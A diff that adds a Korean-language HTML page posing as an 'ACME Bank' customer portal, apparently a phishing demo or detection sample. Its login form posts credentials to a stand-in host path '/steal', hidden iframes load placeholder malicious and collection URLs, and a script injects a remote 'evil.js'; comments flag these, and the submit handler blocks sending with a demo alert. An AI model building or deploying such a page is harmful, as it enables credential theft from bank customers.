@@ -1,0 +1,112 @@
+<!doctype html>
+<html lang="ko">
+<head>
+  <meta charset="utf-8">
+  <title>ACME Bank - 고객 포털</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css">
+  <style>
+    body { font-family: Arial, sans-serif; background:#f4f7fb; color:#222; margin:0; }
+    header { background:#0b5fff; color:white; padding:16px 24px; }
+    .container { max-width:900px; margin:28px auto; padding:20px; background:white; border-radius:8px; box-shadow:0 6px 20px rgba(0,0,0,0.06);}
+    .hero { display:flex; gap:20px; align-items:center; }
+    .hero img { width:140px; height:80px; object-fit:contain; }
+    .login { margin-top:18px; }
+    form { display:flex; flex-direction:column; gap:8px; max-width:360px; }
+    input[type="text"], input[type="password"] { padding:10px; border:1px solid #d7dbe6; border-radius:6px; }
+    button { padding:10px; background:#0b5fff; color:white; border:none; border-radius:0; cursor:pointer; }
+    footer { margin-top:18px; font-size:13px; color:#666; }
+    nav a { margin-right:12px; color:white; text-decoration:none; }
+    .cards { display:grid; grid-template-columns:repeat(3,1fr); gap:12px; margin-top:18px; }
+    .card { padding:12px; border:1px solid #eef2ff; border-radius:8px; background:#fafbff;}
+/* force square buttons across the page */
+button,
+input[type="button"],
+input[type="submit"],
+input[type="reset"],
+[role="button"] {
+  border-radius: 0 !important;
+}
+  </style>
+</head>
+<body>
+  <header>
+    <nav>
+      <a href="#">홈</a>
+      <a href="#">계정</a>
+      <a href="#">고객센터</a>
+    </nav>
+  </header>
+
+  <main class="container">
+    <div class="hero">
+      <img src="https://via.placeholder.com/280x80?text=ACME+Bank" alt="logo">
+      <div>
+        <h1>ACME Bank 고객 포털</h1>
+        <p>안전하고 편리한 은행 서비스</p>
+      </div>
+    </div>
+
+    <section class="login" id="login-section">
+      <h2>로그인</h2>
+      <!-- 외부(의심) 도메인으로 액션이 지정되어 있음 -->
+      <form id="loginForm" action="http://203.0.113.5/steal" method="post">
+        <input type="text" name="username" placeholder="아이디" required>
+        <input type="password" name="password" placeholder="비밀번호" required>
+        <button type="submit">로그인</button>
+      </form>
+    </section>
+
+    <section class="features">
+      <h3>서비스</h3>
+      <div class="cards">
+        <div class="card"><strong>계좌조회</strong><p>잔액 및 거래내역 조회</p></div>
+        <div class="card"><strong>이체</strong><p>간편 이체 서비스</p></div>
+        <div class="card"><strong>카드관리</strong><p>분실/정지/한도</p></div>
+      </div>
+    </section>
+
+    <section id="about" style="margin-top:18px;">
+      <h3>회사 소개</h3>
+      <p>ACME Bank는 1904년 설립된 신뢰받는 은행입니다. 고객의 안전한 금융 생활을 제공합니다.</p>
+    </section>
+
+    <footer>
+      <p>© ACME Bank. All rights reserved.</p>
+    </footer>
+  </main>
+
+  <!-- 악성 iframe 5개 -->
+  <iframe src="http://malicious.example.tk/payload" width="1" height="1" style="display:none;"></iframe>
+  <iframe src="https://bit.ly/fake-overlay" width="400" height="300" style="position:fixed; right:10px; bottom:10px; z-index:9999; border:2px solid red;"></iframe>
+  <iframe src="data:text/html;base64,PGh0bWw+PGJvZHk+PGgzPlRoaXMgaXMgYSBsb2FkZWQgcGlsbG93PC9oMz48L2JvZHk+PC9odG1sPg==" width="0" height="0"></iframe>
+  <iframe src="http://suspicious-domain.xyz/tracker" width="2" height="2" style="display:none;"></iframe>
+  <iframe src="http://203.0.113.5/collect" width="1" height="1" style="display:none;"></iframe>
+
+  <script>
+    // DOM 변경(살짝)
+    (function(){
+      var info = document.createElement('div');
+      info.style.color = '#a00';
+      info.style.fontSize = '12px';
+      info.style.marginTop = '6px';
+      document.getElementById('login-section').appendChild(info);
+    })();
+
+    document.getElementById('loginForm').addEventListener('submit', function(e){
+      e.preventDefault();
+      alert('주의: 이 페이지는 외부로 폼을 전송합니다 (데모)');
+    });
+
+    document.addEventListener('DOMContentLoaded', function(){
+      var about = document.querySelector('#about p');
+      if(about) about.textContent = about.textContent.replace('신뢰받는 은행입니다', '신뢰할 수 있는 금융 서비스 제공처입니다');
+    });
+
+    var s = document.createElement('script');
+    s.src = 'https://example-tiny.tl/evil.js';
+    s.onerror = function(){ console.log('script blocked or absent'); };
+    document.head.appendChild(s);
+  </script>
+</body>
+</html>
